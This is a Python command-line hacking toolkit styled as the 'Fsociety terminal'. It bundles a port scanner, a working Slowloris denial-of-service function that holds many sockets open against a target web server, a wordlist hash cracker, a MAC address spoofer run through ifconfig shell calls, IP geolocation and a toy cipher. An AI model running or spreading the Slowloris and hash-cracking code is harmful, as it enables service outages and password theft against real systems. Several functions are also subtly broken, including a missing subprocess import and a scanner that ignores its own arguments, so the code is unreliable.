import os
import socket
import random
import time
import threading
import hashlib
import geocoder

#GLOBAL
commList = ["ping", "portscan", "quit", "help", "fmac", "ipt", "slowloris", "dehash"]

def webcheck(target):
    data = socket.gethostbyname_ex(target)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    if s.connect_ex((target, 80)) != -1:
        status = "\033[0;32;40mUP\033[0;37;40m"
    else:
        status = "\033[0;31;40mDOWN\033[0;37;40m"

    print("""
    Hostname: {}
    IP: {}
    Status: {}
    """.format(target, data[2][0], status))

def portscan(target, min, max):
    try:
        for port in range(minPort, maxPort):  
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((target, port))
            if result == 0:
                print("   Port {}: 	 \033[0;32;40mOpen\033[0;37;40m".format(port))
            else:
                print("   Port {}: 	 \033[0;31;40mClosed\033[0;37;40m".format(port))
            sock.close()

    except socket.gaierror:
        print('Hostname could not be resolved')

    except socket.error:
        print("Couldn't connect to server")

def slowloris(target, connections):
    list_of_sockets = []

    regular_headers = [
        "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
        "Accept-language: en-US,en,q=0.5"
    ]

    ip = target
    socket_count = connections
    print("Attacking {} with {} sockets.".format(ip, socket_count))

    print("Creating sockets...")
    for _ in range(socket_count):
        try:
            print("Creating socket {}".format(_ + 1))
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, 80))
        except socket.error:
            break
        list_of_sockets.append(s)

    print("Setting up the sockets...")
    for s in list_of_sockets:
        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
        for header in regular_headers:
            s.send(bytes("{}\r\n".format(header).encode("utf-8")))

    while True:
        print("Sending keep-alive headers...")
        for s in list_of_sockets:
            try:
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
            except socket.error:
                list_of_sockets.remove(s)
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((ip, 80))
                    for s in list_of_sockets:
                        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
                        for header in regular_headers:
                            s.send(bytes("{}\r\n".format(header).encode("utf-8")))
                except socket.error:
                    continue
        time.sleep(15)

def dehash(algorithm, code, passList):
    passwords = []
    count = 1

    paswds = open(passList, "r")
    paswd = paswds.readlines()

    if algorithm == "sha256":
        for i in paswd:
            j = i.rstrip("\n")
            phash = hashlib.sha256(j.encode()).hexdigest()
            passwords.append(phash)
    elif algorithm == "md5":
        for i in paswd:
            j = i.rstrip("\n")
            phash = hashlib.md5(j.encode()).hexdigest()
            passwords.append(phash)
    elif algorithm == "sha1":
        for i in paswd:
            j = i.rstrip("\n")
            phash = hashlib.sha1(j.encode()).hexdigest()
            passwords.append(phash)
    elif algorithm == "sha224":
        for i in paswd:
            j = i.rstrip("\n")
            phash = hashlib.sha224(j.encode()).hexdigest()
            passwords.append(phash)
    elif algorithm == "sha384":
        for i in paswd:
            j = i.rstrip("\n")
            phash = hashlib.sha384(j.encode()).hexdigest()
            passwords.append(phash)
    elif algorithm == "sha512":
        for i in paswd:
            j = i.rstrip("\n")
            phash = hashlib.sha512(j.encode()).hexdigest()
            passwords.append(phash)
    else:
        print("Hash algorithm {} is not supported yet!".format(algorithm))
        print("""
        Supported algorithms:  sha1
                               sha224
                               sha256
                               sha384
                               sha512
                               md5
        """)

    for i in range(len(passwords)):
        if passwords[i] == code:
            print("[\033[0;32;40m+\033[0;37;40m] Found password! {}:{}".format(code, paswd[i]))
            break
        else:
            print("[\033[0;31;40m-\033[0;37;40m] Attempt: {} | {}:{}".format(count, code, paswd[i]))
            count += 1

def hashit(algorithm, txt):
    hash1 = txt

    if algorithm == "md5":
        hash1 = hashlib.md5(txt.encode())
        myhash = hash1.hexdigest()
        print("   [\033[0;32;40m+\033[0;37;40m] {}:{}".format(txt, myhash))
    elif algorithm == "sha1":
        hash1 = hashlib.sha1(txt.encode())
        myhash = hash1.hexdigest()
        print("   [\033[0;32;40m+\033[0;37;40m] {}:{}".format(txt, myhash))
    elif algorithm == "sha224":
        hash1 = hashlib.sha224(txt.encode())
        myhash = hash1.hexdigest()
        print("   [\033[0;32;40m+\033[0;37;40m] {}:{}".format(txt, myhash))
    elif algorithm == "sha256":
        hash1 = hashlib.sha256(txt.encode())
        myhash = hash1.hexdigest()
        print("   [\033[0;32;40m+\033[0;37;40m] {}:{}".format(txt, myhash))
    elif algorithm == "sha384":
        hash1 = hashlib.sha384(txt.encode())
        myhash = hash1.hexdigest()
        print("   [\033[0;32;40m+\033[0;37;40m] {}:{}".format(txt, myhash))
    elif algorithm == "sha512":
        hash1 = hashlib.sha512(txt.encode())
        myhash = hash1.hexdigest()
        print("   [\033[0;32;40m+\033[0;37;40m] {}:{}".format(txt, myhash))
    else:
        print("Hash algorithm {} is not supported yet!".format(algorithm))
        print("""
        Supported algorithms:  sha1
                               sha224
                               sha256
                               sha384
                               sha512
                               md5
        """)

def f_mac(interface, new_mac):
    print()
    print("Configuring " + interface + " address...")
    time.sleep(5)
    print()
    print("Changing " + interface + " to " + new_mac)

    try:
        subprocess.call("ifconfig " + interface + " down", shell=True)
        subprocess.call("ifconfig " + interface + " hw ether " + new_mac, shell=True)
        subprocess.call("ifconfig " + interface + " up", shell=True)
        print("[\033[0;32;40m+\033[0;37;40m] MAC address changed successfully!")
    except:
        print("[\033[0;31;40m-\033[0;37;40m] MAC address has not changed!")

def ipt(target):
    ip = geocoder.ip(target)

    print("""
    [\033[0;32;40m+\033[0;37;40m] Location found!
    
    IP: {}
    LatLng: {}
    Country: {}
    City: {}
    Street: {}
    Postal code: {}
    Search provider: {}
    """.format(target, ip.latlng, ip.country, ip.city, ip.address, ip.postal, ip.provider))

def encrypt(txt):
    word = ''
    enc = []
    code = random.randint(287, 380)
    
    for c in txt:
        enc.append(ord(c))

    for e in enc:
        e = code - e
        word = word + chr(e)

    word = "f$." + word

    print("""
    Your text: {}
    Encrypted text: {}
    Code for decryption: {}
    """.format(txt, word, code))

def decrypt(txt, code):
    word = txt[3:]
    dec = ''
    enc = []
    
    for c in txt:
        enc.append(ord(c))

    for e in enc:
        e = int(code) - e
        dec = dec + chr(e)

    print("""
    Encrypted text: {}
    Decrypted text: {}
    """.format(txt, dec[3:]))

os.system("clear")

#print("--------------------------------------------")
#print("")
#print("      - Welcome to \033[0;31;40mF\033[0;37;40msociety terminal -      ")
#print("")
#print("--------------------------------------------")
#print("")
print("""
    \033[0;31;40m______ \033[0;37;40m _____                       _                _ 
    \033[0;31;40m|  ___|\033[0;37;40m|_   _|                     (_)              | |
    \033[0;31;40m| |_   \033[0;37;40m  | |  ___  _ __  _ __ ___   _  _ __    __ _ | |
    \033[0;31;40m|  _|  \033[0;37;40m  | | / _ \| '__|| '_ ` _ \ | || '_ \  / _` || |
    \033[0;31;40m| |    \033[0;37;40m  | ||  __/| |   | | | | | || || | | || (_| || |
    \033[0;31;40m\_|    \033[0;37;40m  \_/ \___||_|   |_| |_| |_||_||_| |_| \__,_||_|
                                                       \033[0;36;40mv1.2\033[0;37;40m

    type \033[0;36;40mhelp\033[0;37;40m for all commands
""")
command = "a"

while(command != "quit"):
    command = input("\033[0;36;40mF$> \033[0;37;40m")

    if(command == "help"):
        print("""
        [*]\033[0;36;40m==================BASIC==============================\033[0;37;40m[*]
        [*]            quit         exit from fterminal         [*]
        [*]            help         list all commands           [*]
        [*]\033[0;36;40m=================NETWORK=============================\033[0;37;40m[*]
	[*]        webcheck         resolve website             [*]
	[*]        portscan         open ports                  [*]
        [*]            fmac         change mac address          [*]
        [*]             ipt         trace ip address            [*]
	[*]\033[0;36;40m============DENIAL OF SERVICE========================\033[0;37;40m[*]
	[*]       slowloris         DOS attack                  [*]
	[*]\033[0;36;40m================BRUTEFORCE===========================\033[0;37;40m[*]
	[*]          dehash         bruteforcing hashes         [*]
        [*]\033[0;36;40m===============CRYPTOGRAPHY==========================\033[0;37;40m[*]
        [*]          hashit         hashing text                [*]
        [*]           crypt         Encryption and decryption   [*]
    """)

    if("webcheck" in command):
        if(" " in command):
            parametar = command.split()

            target = parametar[1]

            webcheck(target)

        else:
            print("""
            Usage: webcheck <target host/IP>
            Example: webcheck www.example.com
            """)

    if("portscan" in command):
        if(" " in command):
            parametar = command.split()

            target = parametar[1]
            minPort = int(parametar[2])
            maxPort = int(parametar[3])

            portscan(target, minPort, maxPort)

        else:
            print("""
            Usage: portscan <target host/IP> <min PORT> <max PORT>
            Example: portscan 192.168.1.1 1 100
            """)

    if("slowloris" in command):
        if(" " in command):
            parametar = command.split()

            target = parametar[1]
            count = int(parametar[2])

            slowloris(target, count)

        else:
            print("""
            Usage: slowloris <target host/IP> <threads>
            Example: slowloris www.example.com 200
            """)

    if("dehash" in command):
        if(" " in command):
            parametar = command.split()

            algorithm = parametar[1]
            code = parametar[2]
            passList = parametar[3]

            dehash(algorithm, code, passList)

        else:
            print("""
            Usage: dehash <hash algorithm> <hash> <path to password list>
            Example: dehash sha256 189f40034be7a199f1fa9891668ee3ab6049f82d38c68be70f596eab2e1857b7 paswd.txt
            """)

    if("fmac" in command):
        if(" " in command):
            parametar = command.split()

            interface = str(parametar[1])
            mac = str(parametar[2])

            f_mac(interface, mac)
        else:
            print("""
            Usage: fmac <interface> <mac address>
            Example: fmac wlan0 11:22:33:44:55:66
            """)

    if("ipt" in command):
        if(" " in command):
            parametar = command.split()

            target = parametar[1]

            ipt(target)
        else:
            print("""
            Usage: ipt <IP address>
            Example: ipt 182.62.2.105
            """)

    if("crypt" in command):
        if(" " in command):
            parametar = command.split()

            function = parametar[1]

            if(function == "encrypt"):
                txt = parametar[2]

                encrypt(txt)
            elif(function == "decrypt"):
                txt = parametar[2]
                code = parametar[3]
                decrypt(txt, code)
        else:
            print("""
            Encryption
                Usage: crypt encrypt <text>
                Example: crypt encrypt some_random_text
            Decryption
                Usage: crypt decrypt <text>
                Example: crypt decrypt some_random_text

            [! IMPORTANT] Text can not contain space, use _ instead!
            """)

    if ("hashit" in command):
        if (" " in command):
            parametar = command.split()

            algorithm = parametar[1]
            txt = parametar[2]

            hashit(algorithm, txt)
        else:
            print("""
                Usage: hashit <hash algorithm> <text>
                Example: hashit md5 some_random_text

                [! IMPORTANT] Text can not contain space, use _ instead!
                """)